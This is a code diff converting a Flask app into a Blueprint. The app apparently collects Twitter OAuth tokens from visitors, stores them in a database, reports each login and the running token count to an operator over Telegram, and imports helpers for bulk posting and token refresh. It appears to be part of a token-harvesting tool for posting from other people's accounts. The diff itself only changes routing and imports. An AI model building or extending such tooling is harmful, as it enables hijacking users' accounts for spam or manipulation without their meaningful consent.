@@ -1,15 +1,15 @@
-from flask import Flask, redirect, request, session, render_template, url_for
+from flask import Blueprint, redirect, request, session, render_template, url_for
 import requests
 from helpers import (
     generate_code_verifier_and_challenge, send_message_via_telegram, post_tweet,
     get_twitter_username_and_profile, generate_random_string, handle_post_single,
-    handle_post_bulk, handle_refresh_single, handle_refresh_bulk
+    handle_post_bulk, handle_refresh_single, handle_refresh_bulk, refresh_token_in_db
 )
-from database import store_token, get_all_tokens, get_total_tokens, restore_from_backup
+from database import store_token, get_all_tokens, get_total_tokens
 from config import Config
 
-app = Flask(__name__)
-app.secret_key = Config.SECRET_KEY
+# Set up Blueprint for routes
+app = Blueprint('routes', __name__)
 
 @app.route('/')
 def home():
@@ -19,7 +19,7 @@ def home():
 
     if 'username' in session:
         send_message_via_telegram(f"👋 @{session['username']} just returned to the website.")
-        return redirect(url_for('welcome'))
+        return redirect(url_for('routes.welcome'))
 
     if request.args.get('authorize') == 'true':
         state = "0"
@@ -68,7 +68,7 @@ def home():
                     f"👤 Username: @{username}\n"
                     f"📊 Total Tokens in Database: {total_tokens}"
                 )
-                return redirect(url_for('welcome'))
+                return redirect(url_for('routes.welcome'))
             else:
                 return "Error retrieving user info with access token", 400
 
@@ -94,7 +94,7 @@ def welcome():
 @app.route('/logout')
 def logout():
     session.clear()
-    return redirect(url_for('home'))
+    return redirect(url_for('routes.home'))
 
 @app.route('/webhook', methods=['POST'])
 def telegram_webhook():
